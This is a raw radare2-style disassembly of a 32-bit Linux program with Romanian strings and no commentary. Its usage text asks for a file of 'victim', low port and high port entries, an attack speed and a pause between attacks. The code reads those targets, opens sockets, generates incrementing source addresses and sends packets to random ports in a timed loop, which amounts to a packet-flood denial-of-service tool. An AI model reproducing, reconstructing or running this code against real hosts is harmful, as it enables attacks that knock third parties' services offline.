mov ecx, dword [var_a0h]
add ecx, 0x1000
mov dword [var_68h], ecx
mov ecx, dword [var_e0h]
mov dword [var_5ch], ecx
mov eax, dword [var_54h]
cmp eax, dword [var_dch]
jb 0x8049d43
add eax, 0x1000
mov dword [var_54h], eax
push 0
push 0
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08049484
add esp, 0xc
test eax, eax
je 0x8049f0c
push 0x34
mov ecx, dword [var_f4h_2]
jmp 0x8049e9a
nop
mov eax, dword [ebx + 0x10]
add eax, dword [ebx + 4]
lea esi, [eax - 0x1000]
cmp word [var_6ah], 1
ja 0x8049f07
mov eax, dword [ebx + 0x14]
add eax, dword [ebx + 8]
add eax, 0xfffff000
mov dword [var_5ch], eax
mov word [var_6ah], 2
mov eax, dword [var_a0h]
mov dword [var_68h], eax
push 0
push 0
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08049484
add esp, 0xc
test eax, eax
je 0x8049f0c
push 0x34
mov ecx, dword [var_c8h_2]
jmp 0x8049e1e
lea esi, [esi]
mov eax, dword [ebx + 0x10]
add eax, dword [ebx + 4]
lea esi, [eax - 0x1000]
mov edx, dword [ebx + 0x14]
add edx, dword [ebx + 8]
mov eax, dword [var_5ch]
mov dword [var_c0h], eax
mov word [var_6ah], 2
mov eax, dword [var_a0h]
mov dword [var_68h], eax
add edx, 0xfffff000
mov dword [var_5ch], edx
push 0
push 0
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08049484
add esp, 0xc
test eax, eax
je 0x8049f0c
push 0x34
mov ecx, dword [var_f4h_2]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08049440
add esp, 0xc
cmp eax, 1
jne 0x8049f0c
push 0
push esi
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08049484
add esp, 0xc
test eax, eax
je 0x8049f0c
call fcn.08049364
push eax
call fcn.08049350
push eax
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08049440
add esp, 0xc
cmp eax, 1
jne 0x8049f0c
push 0
call fcn.08049344
add eax, esi
push eax
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08049484
add esp, 0xc
test eax, eax
je 0x8049f0c
push 4
mov ecx, dword [var_f0h]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08049440
add esp, 0xc
cmp eax, 1
jne 0x8049f0c
push 0
push dword [var_68h]
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08049484
add esp, 0xc
test eax, eax
je 0x8049f0c
mov ecx, dword [var_f4h]
push ecx
mov ecx, dword [var_ch]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08049440
add esp, 0xc
cmp eax, 1
jne 0x8049f0c
mov ecx, dword [var_c4h_2]
push ecx
push 6
call fcn.0804937c
mov ecx, dword [var_ech_2]
push ecx
mov ecx, dword [var_8h]
push ecx
push 0x1e
call fcn.08049390
test eax, eax
jl 0x8049f0c
xor eax, eax
jmp 0x8049f2e
nop
mov esp, dword [var_cch_2]
cmp dword [var_c4h], 0xffffffff
je 0x8049f29
mov ecx, dword [var_c4h]
push ecx
push 6
call fcn.0804937c
mov eax, 0xffffffff
lea esp, [var_104h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push ebx
call fcn.08048551
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_8h]
push str.S_a_apasat_CtrlC.Terminare._n
call sym.imp.printf
push ebx
call sym.imp.exit
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_8h]
push str.Violare_de_segmentare.Terminare._n
call sym.imp.printf
push ebx
call sym.imp.exit
push ebp
mov ebp, esp
sub esp, 0x4aa8
push edi
push esi
push ebx
mov ebx, dword [arg_8h]
mov esi, dword [arg_ch]
call fcn.08048a98
cmp ebx, 4
je 0x8048c50
push dword [esi]
push str.Uzaj:__s__nume_fisier___viteza_atac___pauza_dintre_atacuri__n
call sym.imp.printf
push str.Fisierul_are_urmatoarea_structura_:__victima____lowport___highport__1_n
call sym.imp.printf
push 1
call sym.imp.exit
lea esi, [esi]
push dword [esi + 8]
call sym.imp.atol
mov dword [ebp - 0x4a5c], eax
push dword [esi + 0xc]
call sym.imp.atol
mov dword [ebp - 0x4a60], eax
push 0x80492ea
push dword [esi + 4]
call sym.imp.fopen
mov dword [ebp - 0x4a68], eax
mov dword [ebp - 0x4a54], 0
add esp, 0x10
lea eax, [ebp - 0x4668]
mov dword [ebp - 0x4a84], eax
jmp 0x8048ef0
lea esi, [esi]
mov esi, dword [ebp - 0x4a84]
mov edi, esi
xor eax, eax
cld
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
dec ecx
cmp ecx, 3
jbe 0x8048ef0
xor ebx, ebx
lea edx, [ebp - 0x4a50]
mov dword [ebp - 0x4a8c], edx
lea edi, [var_fa0h]
lea eax, [var_1f40h]
mov dword [ebp - 0x4a88], eax
lea edx, [ebp - 0x2ee0]
mov dword [ebp - 0x4a80], edx
lea eax, [ebp - 0x3e80]
mov dword [ebp - 0x4a90], eax
cmp byte [ebp - 0x4668], 0x20
je 0x8048d14
mov ecx, dword [ebp - 0x4a8c]
mov edx, esi
mov al, byte [ebx + esi]
mov byte [ebx + ecx], al
inc ebx
cmp byte [ebx + edx], 0x20
jne 0x8048d05
mov edx, dword [ebp - 0x4a8c]
mov byte [ebx + edx], 0
inc ebx
mov esi, ebx
push edx
call sym.imp.gethostbyname
mov ecx, eax
mov eax, dword [ebp - 0x4a54]
shl eax, 2
mov dword [ebp - 0x4a6c], eax
mov ecx, dword [ecx + 0x10]
mov edx, dword [ecx]
mov eax, dword [edx]
mov edx, dword [ebp - 0x4a6c]
mov dword [edx + edi], eax
mov eax, dword [ebp - 0x4a8c]
push eax
push 0x80492ec
call sym.imp.printf
add esp, 0xc
mov edi, dword [ebp - 0x4a84]
cmp byte [ebx + edi], 0x20
je 0x8048d97
mov edx, dword [ebp - 0x4a8c]
mov dword [ebp - 0x4a70], edx
mov ecx, ebx
sub ecx, esi
mov dword [ebp - 0x4aa4], edi
mov al, byte [ebx + edi]
mov edx, dword [ebp - 0x4a70]
mov byte [ecx + edx], al
inc ebx
mov eax, dword [ebp - 0x4aa4]
cmp byte [ebx + eax], 0x20
jne 0x8048d74
mov ecx, ebx
sub ecx, esi
mov edx, dword [ebp - 0x4a8c]
mov byte [ecx + edx], 0
inc ebx
mov esi, ebx
push edx
call sym.imp.atoi
mov ecx, eax
mov eax, dword [ebp - 0x4a88]
mov edx, dword [ebp - 0x4a6c]
mov dword [edx + eax], ecx
mov eax, dword [ebp - 0x4a8c]
push eax
push 0x80492ec
call sym.imp.printf
add esp, 0xc
mov edi, dword [ebp - 0x4a84]
cmp byte [ebx + edi], 0x20
je 0x8048e13
mov edx, dword [ebp - 0x4a8c]
mov dword [ebp - 0x4a74], edx
nop
lea esi, [esi]
mov ecx, ebx
sub ecx, esi
mov dword [ebp - 0x4aa4], edi
mov al, byte [ebx + edi]
mov edx, dword [ebp - 0x4a74]
mov byte [ecx + edx], al
inc ebx
mov eax, dword [ebp - 0x4aa4]
cmp byte [ebx + eax], 0x20
jne 0x8048df0
mov ecx, ebx
sub ecx, esi
mov edx, dword [ebp - 0x4a8c]
mov byte [ecx + edx], 0
inc ebx
mov esi, ebx
push edx
call sym.imp.atoi
mov ecx, eax
mov eax, dword [ebp - 0x4a80]
mov edx, dword [ebp - 0x4a6c]
mov dword [edx + eax], ecx
mov eax, dword [ebp - 0x4a8c]
push eax
push 0x80492ec
call sym.imp.printf
add esp, 0xc
mov edx, dword [ebp - 0x4a84]
mov dword [ebp - 0x4a78], edx
mov cl, byte [ebx + edx]
cmp cl, 0x20
je 0x8048eb3
cmp cl, 0xd
je 0x8048eb3
cmp cl, 0xa
je 0x8048eb3
mov edi, dword [ebp - 0x4a8c]
mov ecx, edx
mov al, byte [ebx + ecx]
mov byte [ebp - 0x4aa4], al
test al, al
je 0x8048eb3
mov dword [ebp - 0x4aa0], ebx
sub dword [ebp - 0x4aa0], esi
mov edx, dword [ebp - 0x4aa0]
mov byte [edx + edi], al
inc ebx
mov eax, dword [ebp - 0x4a78]
mov al, byte [ebx + eax]
mov byte [ebp - 0x4aa4], al
cmp al, 0x20
je 0x8048eb3
cmp al, 0xd
je 0x8048eb3
cmp al, 0xa
jne 0x8048e75
sub ebx, esi
mov edx, dword [ebp - 0x4a8c]
mov byte [ebx + edx], 0
push edx
call sym.imp.atoi
mov ecx, eax
mov eax, dword [ebp - 0x4a90]
mov edx, dword [ebp - 0x4a6c]
mov dword [edx + eax], ecx
mov eax, dword [ebp - 0x4a8c]
push eax
push 0x80492f0
call sym.imp.printf
inc dword [ebp - 0x4a54]
add esp, 0xc
mov edx, dword [ebp - 0x4a68]
push edx
push 0x3e8
mov eax, dword [ebp - 0x4a84]
push eax
call sym.imp.fgets
mov ecx, eax
add esp, 0xc
test ecx, ecx
jne 0x8048ca0
dec dword [ebp - 0x4a54]
mov edx, dword [ebp - 0x4a68]
push edx
call sym.imp.fclose
push 0x11
push 2
push 2
call sym.imp.socket
mov ecx, eax
mov dword [0x804a470], ecx
add esp, 0x10
test ecx, ecx
jge 0x8048f52
push str.socket__raw_
call sym.imp.perror
push 1
call sym.imp.exit
push 0x11
push 2
push 2
call sym.imp.socket
mov dword [0x804a45c], eax
add esp, 0xc
test eax, eax
jge 0x8048f80
push str.socket
call sym.imp.perror
push 1
call sym.imp.exit
lea esi, [esi]
push 0x400
call sym.imp.malloc
mov dword [ebp - 0x4a64], eax
mov ebx, 1
add esp, 4
mov dword [ebp - 0x4a94], 3
mov dword [ebp - 0x4a98], 5
mov dword [ebp - 0x4a9c], 7
mov eax, 0x80008001
mul ebx
mov ecx, edx
shr ecx, 0xf
mov esi, ecx
shl esi, 0x10
sub esi, ecx
mov eax, ebx
sub eax, esi
mov dword [0x804a458], eax
mov eax, 0x80808081
mul dword [ebp - 0x4a9c]
mov ecx, edx
shr ecx, 7
mov esi, ecx
shl esi, 8
sub esi, ecx
mov eax, dword [ebp - 0x4a9c]
mov dword [ebp - 0x4aa0], eax
sub dword [ebp - 0x4aa0], esi
mov edx, dword [ebp - 0x4aa0]
push edx
mov eax, 0x80808081
mul dword [ebp - 0x4a98]
mov ecx, edx
shr ecx, 7
mov esi, ecx
shl esi, 8
sub esi, ecx
mov eax, dword [ebp - 0x4a98]
mov dword [ebp - 0x4aa0], eax
sub dword [ebp - 0x4aa0], esi
mov edx, dword [ebp - 0x4aa0]
push edx
mov eax, 0x80808081
mul dword [ebp - 0x4a94]
mov ecx, edx
shr ecx, 7
mov esi, ecx
shl esi, 8
sub esi, ecx
mov eax, dword [ebp - 0x4a94]
mov dword [ebp - 0x4aa0], eax
sub dword [ebp - 0x4aa0], esi
mov edx, dword [ebp - 0x4aa0]
push edx
mov eax, 0x80808081
mul ebx
mov ecx, edx
shr ecx, 7
mov esi, ecx
shl esi, 8
sub esi, ecx
mov ecx, ebx
sub ecx, esi
push ecx
push str._i._i._i._i
mov eax, dword [ebp - 0x4a64]
push eax
call sym.imp.sprintf
mov edx, dword [ebp - 0x4a64]
push edx
call sym.imp.gethostbyname
mov ecx, eax
mov ecx, dword [ecx + 0x10]
mov eax, dword [ecx]
mov edx, dword [eax]
mov dword [ebp - 0x4a58], edx
xor esi, esi
add esp, 0x1c
cmp esi, dword [ebp - 0x4a54]
jg 0x8049155
lea eax, [ebp - 0x2ee0]
mov dword [ebp - 0x4a7c], eax
lea edi, [var_1f40h]
lea esi, [esi]
lea ecx, [esi*4]
mov eax, ebx
xor edx, edx
div dword [ecx + ebp - 0x3e80]
test edx, edx
jne 0x8049145
mov dword [ebp - 0x4aa4], 0xffff
mov edx, dword [0x804a458]
sub dword [ebp - 0x4aa4], edx
mov eax, dword [ebp - 0x4a7c]
mov edx, dword [ecx + eax]
sub edx, dword [edi]
inc edx
mov dword [ebp - 0x4aa0], edx
mov eax, dword [ebp - 0x4aa4]
xor edx, edx
div dword [ebp - 0x4aa0]
mov dword [ebp - 0x4aa4], edx
mov eax, dword [ebp - 0x4aa4]
add ax, word [edi]
movzx edx, ax
push edx
push dword [ecx + ebp - 0xfa0]
mov eax, dword [ebp - 0x4a58]
push eax
call fcn.080489c8
add esp, 0xc
add edi, 4
inc esi
cmp esi, dword [ebp - 0x4a54]
jle 0x80490d0
mov eax, ebx
xor edx, edx
div dword [ebp - 0x4a5c]
test edx, edx
jne 0x8049172
mov edx, dword [ebp - 0x4a60]
push edx
call sym.imp.usleep
add esp, 4
add dword [ebp - 0x4a94], 2
add dword [ebp - 0x4a98], 3
add dword [ebp - 0x4a9c], 4
inc ebx
jmp 0x8048fb6
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
push ebx
call fcn.080491c5
push ebp
mov ebp, esp
push esi
push ebx
mov esi, dword [arg_8h]
mov ebx, dword [arg_ch]
mov ecx, dword [arg_10h]
xor edx, edx
cmp edx, ecx
jge 0x80494d1
mov al, byte [edx + ebx]
cmp byte [edx + esi], al
je 0x80494cc
xor eax, eax
jmp 0x80494d6
inc edx
cmp edx, ecx
jl 0x80494c0
mov eax, 1
lea esp, [var_8h]
pop ebx
pop esi
leave
ret
push ebp
mov ebp, esp
push ebx
mov edx, dword [arg_10h]
mov ebx, dword [arg_8h]
mov ecx, dword [arg_ch]
test edx, edx
jle 0x804953f
lea esi, [esi]
mov al, byte [ecx]
mov byte [ebx], al
inc ebx
inc ecx
dec edx
test edx, edx
jg 0x8049534
mov ebx, dword [var_4h]
leave
ret
